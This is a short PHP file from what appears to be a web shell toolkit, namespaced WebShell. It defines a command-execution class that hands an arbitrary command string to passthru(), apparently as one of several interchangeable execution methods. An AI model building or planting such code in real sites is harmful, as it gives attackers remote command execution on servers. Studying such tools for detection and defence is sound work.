<?php
namespace WebShell;

final class PassthruExecutionMethod extends BlindExecutionMethod {
    protected function run_command($cmd) {
        passthru($cmd);
    }
}
?>
